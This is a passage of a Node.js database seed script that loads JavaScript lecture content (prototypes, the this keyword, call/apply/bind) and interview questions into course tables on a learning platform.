        answer: 'The prototype chain of an array is: arr -> Array.prototype -> Object.prototype -> null. When you call arr.toString() or arr.hasOwnProperty(), the engine first looks on the arr instance itself. Not finding it there, it looks on arr.__proto__ (Array.prototype, which has sort, push, map, and an overridden toString). If you call arr.hasOwnProperty(), it is not on Array.prototype either, so the engine walks one level higher to Array.prototype.__proto__ (Object.prototype), where hasOwnProperty lives. Object.prototype.__proto__ is null, which marks the termination point of the search.'
      },
      {
        id: 'js-lec-21-q2',
        title: 'Q2: What is the difference between .prototype and .__proto__ (or Object.getPrototypeOf())?',
        difficulty: 'Hard',
        answer: '1) .prototype is a property that exists ONLY on Constructor Functions and ES6 Classes (e.g., Person.prototype or Array.prototype). It is the blueprint object that will be assigned as the prototype of any future instances created with new Person(). 2) .__proto__ (standardized as Object.getPrototypeOf(instance)) is the actual internal link on every object instance that points to its constructor\'s .prototype object (so p1.__proto__ === Person.prototype is true).'
      },
      {
        id: 'js-lec-21-q3',
        title: 'Q3: When you define a method sayHi() inside an ES6 class Person, why doesn\'t sayHi appear when you console.log(person1)? Why wasn\'t it placed directly on the instance?',
        difficulty: 'Medium',
        answer: 'To follow the DRY (Don\'t Repeat Yourself) principle and save memory! While instance variables (this.name, this.age) differ per person and are created on each instance inside constructor(), the sayHi() method logic is identical for every Person. Therefore, ES6 classes attach sayHi() once onto Person.prototype (non-enumerable), so 10,000 Person instances share a single function in memory instead of allocating 10,000 duplicate function copies.'
      },
      {
        id: 'js-lec-21-q4',
        title: 'Q4: What are the 4 exact steps that happen under the hood when you call new Person("Rohit", 20)?',
        difficulty: 'Medium',
        answer: 'When a constructor or class is invoked with the new keyword: 1) A brand-new empty object {} is allocated in memory. 2) The new object\'s internal [[Prototype]] (__proto__) is linked to Person.prototype. 3) The Person constructor function executes with this bound to that new empty object (populating this.name and this.age). 4) The constructor automatically returns that newly created object (unless the constructor explicitly returns a different non-primitive object).'
      },
      {
        id: 'js-lec-21-q5',
        title: 'Q5: In a child class that uses extends, why does accessing this before calling super() inside the constructor throw a ReferenceError?',
        difficulty: 'Medium',
        answer: 'In ES6 class inheritance, the parent class constructor (invoked via super()) is responsible for allocating and initializing the base instance object assigned to this. Until super() has been called inside the derived class constructor, this is uninitialized, so touching this.account = 12 before super() throws a ReferenceError: Must call super constructor in derived class before accessing \'this\'.'
      },
      {
        id: 'js-lec-21-q6',
        title: 'Q6: Why is Object.create(protoObj) preferred over mutating obj.__proto__ = protoObj at runtime?',
        difficulty: 'Medium',
        answer: '__proto__ is a legacy getter/setter kept mainly for backward compatibility, and mutating an existing object\'s [[Prototype]] after creation (obj.__proto__ = ... or Object.setPrototypeOf()) deoptimizes V8\'s Hidden Classes and Inline Caches, severely hurting performance. Object.create(protoObj) sets the prototype link cleanly at the moment the new object is created.'
      }
    ]
  },
  {
    topic_order: 22,
    slug: 'js-lecture-22-this-keyword-strict-mode-call-apply-bind',
    title: 'Lecture 22: The this Keyword, Strict Mode & Explicit Binding — call(), apply(), and bind() Across All Contexts',
    duration_minutes: 70,
    video_url: 'http://www.youtube.com/watch?v=7tRyccjYgF0',
    video_title: 'JavaScript this Keyword Explained | Call, apply, bind | Javascript Full Course #22',
    doc_links: [
      {
        title: 'MDN Web Docs — The this Keyword Reference',
        url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this',
        link: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this'
      },
      {
        title: 'MDN Web Docs — Function.prototype.call(), apply() & bind()',
        url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/bind',
        link: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/bind'
      }
    ],
    short_description: 'Master Strict vs. Non-Strict mode, predict the exact value of this across global, function, method, constructor, and arrow contexts, and explicitly control this using call(), apply(), and bind().',
    summary_markdown: `### 📌 Topic Overview
The **\`this\`** keyword is one of the most famous interview topics in JavaScript because its value is **determined dynamically at call-time based on *how* a function is invoked** (except for Arrow Functions, which inherit \`this\` lexically).

### 💡 Strict Mode (\`"use strict"\`) vs. Non-Strict Mode
Introduced in ES5, placing \`"use strict";\` at the top of a file or function (and enabled automatically inside ES6 \`class\` bodies and ES Modules) prevents silent bugs:
* Throws a \`ReferenceError\` if you assign to an undeclared variable (\`a = 10\` without \`let\`/\`const\`/\`var\`).
* Throws a \`SyntaxError\` for duplicate parameter names (\`function greet(name, name) {}\`).
* Prevents standalone functions from defaulting \`this\` to the global \`window\` object!

### 💡 The 5 Rules of \`this\` Binding
1. **Global Scope:** In a browser, top-level \`this\` is **window**. In a Node.js CommonJS file, top-level \`this\` is **{} (\`module.exports\`)**. (Note: **\`globalThis\`** provides a universal reference to the global object across all environments).
2. **Standalone Regular Function (\`greet()\` with no object before the dot):**
   * **Non-Strict Mode:** \`this\` defaults to the **Global Object (window / global)**.
   * **Strict Mode (\`"use strict"\`):** \`this\` is **\`undefined\`**!
3. **Object Method Invocation (\`user.greet()\`):** \`this\` points to **the object on the left of the dot** (\`user\`).
4. **ES6 Arrow Functions (\`() => {}\`):** Arrow functions **do NOT have their own \`this\`**! They look up and inherit \`this\` lexically from their surrounding scope.
5. **Constructor / Class Invocation (\`new User()\`):** \`this\` points to the newly created instance object \`{}\`.

### 💡 Explicit Binding: \`call()\`, \`apply()\`, and \`bind()\`
When you want to borrow a function and explicitly force its \`this\` to point to a specific object (\`user2\`):
* **\`fn.call(thisArg, arg1, arg2)\`:** Invokes \`fn\` **immediately** with \`this = thisArg\` and comma-separated arguments.
* **\`fn.apply(thisArg, [arg1, arg2])\`:** Invokes \`fn\` **immediately** with \`this = thisArg\` and arguments passed as an **Array**.
* **\`const boundFn = fn.bind(thisArg, arg1, arg2)\`:** Does **NOT** invoke \`fn\` immediately—returns a **new permanently bound function** that can be called later (e.g., inside event listeners or \`setTimeout\`).

### 🛠️ Code Examples: \`this\` Behavior + \`call\`, \`apply\`, and \`bind\`
\`\`\`javascript
"use strict";

function updateProfile(age, city) {
  console.log(\`\${this.name} is \${age} years old from \${city}\`);
}

const user1 = { name: "Rohit" };
const user2 = { name: "Mohit" };

// 1. call(): Invokes immediately with comma-separated arguments
updateProfile.call(user1, 25, "Kotdwar"); // "Rohit is 25 years old from Kotdwar"

// 2. apply(): Invokes immediately with an Array of arguments
updateProfile.apply(user2, [22, "Delhi"]); // "Mohit is 22 years old from Delhi"

// 3. bind(): Returns a new function with 'this' permanently locked to user1
const rohitUpdater = updateProfile.bind(user1, 25, "Kotdwar");
rohitUpdater(); // "Rohit is 25 years old from Kotdwar"

// 4. Arrow Function inside a Method (Lexical 'this' fixes timer callback bugs!)
const timerObj = {
  seconds: 0,
  start() {
    // Arrow function inherits 'this' (timerObj) from start() method!
    setInterval(() => {
      this.seconds++;
    }, 1000);
  }
};
\`\`\``,
    interview_questions: [
      {
        id: 'js-lec-22-q1',
        title: 'Q1: What is the exact difference between .call(), .apply(), and .bind()?',
        difficulty: 'Easy',
        answer: 'All three methods explicitly set the value of this for a regular function: 1) fn.call(thisArg, a, b) invokes the function immediately and accepts arguments individually (comma-separated). 2) fn.apply(thisArg, [a, b]) invokes the function immediately and accepts arguments as a single Array. 3) fn.bind(thisArg, a, b) does NOT invoke the function immediately; instead, it returns a brand-new function with this permanently bound to thisArg (and optional pre-filled arguments) for later execution.'
      },
      {
        id: 'js-lec-22-q2',
        title: 'Q2: How does the value of this inside a standalone function greet() differ between Strict Mode ("use strict") and Non-Strict Mode?',
        difficulty: 'Medium',
        answer: 'When a regular function is called directly without an object reference (greet()), in Non-Strict Mode the engine performs "this substitution" and defaults this to the global object (window in browsers, global in Node.js). In Strict Mode ("use strict"), this substitution is disabled, so this remains strictly undefined!'
      },
      {
        id: 'js-lec-22-q3',
        title: 'Q3: Classic Interview Trap: If const user = { name: "Rohit", greet: () => console.log(this.name) }, what does user.greet() log and why?',
        difficulty: 'Hard',
        answer: 'It logs undefined (or empty string on window.name), NOT "Rohit"! Why? Because ES6 Arrow Functions do NOT have their own this binding. When you look for the enclosing lexical scope of greet, note that the curly braces of an object literal { ... } do NOT create a lexical scope—they are just an object value in the global scope! Therefore, the arrow function inherits this from the Global Scope (window / {}), where this.name is undefined. Always use a regular method greet() { console.log(this.name); } for object methods.'
      },
      {
        id: 'js-lec-22-q4',
        title: 'Q4: Why does a regular function inside setInterval(function() { this.count++; }, 1000) inside an object method fail to increment the object\'s count, and how do Arrow Functions fix it?',
        difficulty: 'Medium',
        answer: 'When setInterval invokes a regular callback function(), it invokes it as a standalone function (not as obj.callback()), so this inside the callback points to window (or undefined in strict mode) rather than your object! Replacing the callback with an Arrow Function setInterval(() => { this.count++; }, 1000) fixes the bug because the arrow function has no this of its own and lexically inherits this from the enclosing start() method (where this points to your object).'
      },
      {
        id: 'js-lec-22-q5',
        title: 'Q5: Can you change the this of an Arrow Function using .call(), .apply(), or .bind()?',
        difficulty: 'Medium',
        answer: 'No. Because an Arrow Function has no internal [[ThisMode]] slot of its own and resolves this lexically from its defining scope, passing a thisArg to arrowFn.call(obj), .apply(obj), or .bind(obj) is completely ignored (only the regular arguments are passed through).'
      },
      {
        id: 'js-lec-22-q6',
        title: 'Q6: Why does console.log(this) at the top level of a file print window in the browser, but print {} (an empty object) in Node.js?',
        difficulty: 'Medium',
        answer: 'In a browser script, top-level code executes directly in the global window scope. In Node.js (CommonJS), every .js file is wrapped inside a module wrapper function (function(exports, require, module, __filename, __dirname) { ... }) and invoked with this bound to module.exports, which starts as an empty object {}! To access the true global object universally across both browsers and Node.js, use globalThis.'
      }
    ]
  }
];

function sanitizeUrl(raw) {
  if (!raw) return '';
  let u = raw.trim();
  u = u.replace(/^[\[\(]+/, '').replace(/[\]\)]+$/, '');
  return u.trim();
}

function cleanMarkdown(raw) {
  if (!raw) return '';
  let md = raw.replace(/>\s*🎥\s*\*\*Video Creator Credit:\*\*.*?\n+/gi, '');
  md = md.replace(/>\s*\*\*Video Creator Credit:\*\*.*?\n+/gi, '');
  md = md.replace(/\]*\]/gi, '');
  md = md.replace(/<\/?think>/gi, '');

  const lines = md.split('\n');
  const result = [];
  let inCode = false;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    const trimmed = line.trim();

    if (trimmed.startsWith('```')) {
      inCode = !inCode;
      result.push(line);
      continue;
    }

    if (inCode) {
      result.push(line);
      continue;
    }

    if (/^\|[-:\s|]+\|$/.test(trimmed)) continue;

    if (trimmed.startsWith('|') && trimmed.endsWith('|')) {
      const cells = trimmed.slice(1, -1).split('|').map(c => c.trim()).filter(c => c.length > 0);
      if (cells.length > 0) {
        result.push('* **' + cells[0].replace(/^\*\*(.*?)\*\*$/, '$1') + ':** ' + cells.slice(1).join(' — '));
      }
      continue;
    }

    if (trimmed === '---' || trimmed === '***' || trimmed === '___') {
      continue;
    }

    if (trimmed.startsWith('>')) {
      const withoutGt = trimmed.replace(/^>+\s*/, '');
      if (!withoutGt) continue;
      if (withoutGt.startsWith('* ') || withoutGt.startsWith('- ')) {
        result.push(withoutGt);
      } else {
        result.push('* ' + withoutGt);
      }
      continue;
    }

    result.push(line);
  }

  md = result.join('\n');
  return md.replace(/\n{3,}/g, '\n\n').trim();
}

async function seedJavaScriptBatch2() {
  const client = await pool.connect();
  try {
    console.log('--- Seeding JavaScript Track Batch 2 (Lectures 12 to 22) ---');
    await client.query('BEGIN');

    // 1. Locate track 'javascript-mastery'
    const trackRes = await client.query(`SELECT id, slug, name FROM tracks WHERE slug = 'javascript-mastery' LIMIT 1;`);
    if (trackRes.rows.length === 0) {
      throw new Error("Track 'javascript-mastery' not found! Please run Batch 1 first.");
    }
    const trackId = trackRes.rows[0].id;
    console.log(`Found track: [ID:${trackId}] ${trackRes.rows[0].name}`);

    // 2. Upsert Lectures 12 to 22
    for (const lec of batch2Lectures) {
      const cleanSummary = cleanMarkdown(lec.summary_markdown);
      const sanitizedVideoUrl = sanitizeUrl(lec.video_url);

      const practiceArray = lec.interview_questions.map((q) => ({
        id: q.id,
        problemId: q.id.replace(/^js-lec-/, ''),
        title: q.title,
        name: q.title,
        difficulty: q.difficulty,
        description: q.answer,
        answer: q.answer,
        platform: 'Technical Interview QA',
        url: null,
        link: null
      }));

      const practiceJson = JSON.stringify(practiceArray);

      const sanitizedDocs = (lec.doc_links || []).map((doc) => ({
        title: doc.title,
        url: sanitizeUrl(doc.url || doc.link),
        link: sanitizeUrl(doc.url || doc.link)
      }));
      const docLinksJson = JSON.stringify(sanitizedDocs);
      const primaryDocUrl = sanitizedDocs[0]?.url || 'https://developer.mozilla.org/en-US/docs/Web/JavaScript';

      const videoLinksJson = JSON.stringify([
        {
          title: lec.video_title || lec.title,
          url: sanitizedVideoUrl,
          duration: `${lec.duration_minutes || 45}m`,
          creator_name: 'Coder Army',
          creator_channel_url: 'https://www.youtube.com/@CoderArmy9'
        }
      ]);

      // Check if topic exists
      const existing = await client.query(`SELECT id FROM topics WHERE slug = $1 LIMIT 1;`, [lec.slug]);
      let topicId;

      if (existing.rows.length > 0) {
        topicId = existing.rows[0].id;
        await client.query(`
          UPDATE topics SET
            name = $1,
            title = $1,
            topic_order = $2,
            short_description = $3,
            description = $3,
            summary_markdown = $4,
            theory_summary = $4,
            official_docs_url = $5,
            practice_items = $6::jsonb,
            practice_problems = $6::jsonb,
            doc_links = $7::jsonb,
            video_links = $8::jsonb,
            creator_name = 'Coder Army',
            creator_channel_url = 'https://www.youtube.com/@CoderArmy9',
            track_id = $9
          WHERE id = $10;
        `, [
          lec.title,
          lec.topic_order,
          lec.short_description,
          cleanSummary,
          primaryDocUrl,
          practiceJson,
          docLinksJson,
          videoLinksJson,
          trackId,
          topicId
        ]);
      } else {
        const insertRes = await client.query(`
          INSERT INTO topics (
            name, title, slug, topic_order, short_description, description,
            summary_markdown, theory_summary, official_docs_url,
            practice_items, practice_problems, doc_links, video_links,
            creator_name, creator_channel_url, track_id
          ) VALUES (
            $1, $1, $2, $3, $4, $4,
            $5, $5, $6,
            $7::jsonb, $7::jsonb, $8::jsonb, $9::jsonb,
            'Coder Army', 'https://www.youtube.com/@CoderArmy9', $10
          ) RETURNING id;
        `, [
          lec.title,
          lec.slug,
          lec.topic_order,
          lec.short_description,
          cleanSummary,
          primaryDocUrl,
          practiceJson,
          docLinksJson,
          videoLinksJson,
          trackId
        ]);
        topicId = insertRes.rows[0].id;
      }

      // Ensure track_topics mapping (delete by track_id and topic_order to prevent duplicate key constraint)
      await client.query(`
        DELETE FROM track_topics WHERE track_id = $1 AND topic_order = $2;
      `, [trackId, lec.topic_order]);

      await client.query(`
        INSERT INTO track_topics (track_id, topic_id, topic_order)
        VALUES ($1, $2, $3)
        ON CONFLICT (track_id, topic_id) DO UPDATE SET topic_order = EXCLUDED.topic_order;
      `, [trackId, topicId, lec.topic_order]);

      // Sync resources table for video and documentation
      await client.query(`
        DELETE FROM resources WHERE topic_id = $1 AND resource_type IN ('problem', 'practice', 'video', 'documentation');
      `, [topicId]);

      // Insert video resource
      await client.query(`
        INSERT INTO resources (topic_id, title, url, resource_type, estimated_minutes)
        VALUES ($1, $2, $3, 'video', $4);
      `, [topicId, lec.video_title || lec.title, sanitizedVideoUrl, lec.duration_minutes || 45]);

      // Insert documentation resource(s)
      for (const doc of sanitizedDocs) {
        await client.query(`
          INSERT INTO resources (topic_id, title, url, resource_type, estimated_minutes)
          VALUES ($1, $2, $3, 'documentation', 10);
        `, [topicId, doc.title, doc.url]);
      }

      console.log(`[SEED] Lecture ${lec.topic_order} (ID:${topicId}): ${lec.slug} | MdLen: ${cleanSummary.length} | Questions: ${practiceArray.length}`);
    }

    // 3. Update track metadata (total_topics = 22 and estimated_hours) if columns exist in tracks table
    const colCheck = await client.query(`
      SELECT column_name FROM information_schema.columns 
      WHERE table_name = 'tracks' AND column_name IN ('total_topics', 'estimated_hours');
    `);
    const availableCols = colCheck.rows.map(r => r.column_name);

    if (availableCols.includes('total_topics') && availableCols.includes('estimated_hours')) {
      await client.query(`
        UPDATE tracks SET total_topics = 22, estimated_hours = 25 WHERE id = $1;
      `, [trackId]);
      console.log(`Updated tracks metadata: total_topics = 22, estimated_hours = 25`);
    } else if (availableCols.includes('total_topics')) {
      await client.query(`
        UPDATE tracks SET total_topics = 22 WHERE id = $1;
      `, [trackId]);
      console.log(`Updated tracks metadata: total_topics = 22`);
    }

    await client.query('COMMIT');
    console.log('--- JavaScript Batch 2 (Lectures 12 to 22) Seeded Successfully ---');
  } catch (err) {
    await client.query('ROLLBACK');
    console.error('JavaScript Batch 2 seeding failed:', err);
    process.exit(1);
  } finally {
    client.release();
    process.exit(0);
  }
}

seedJavaScriptBatch2();
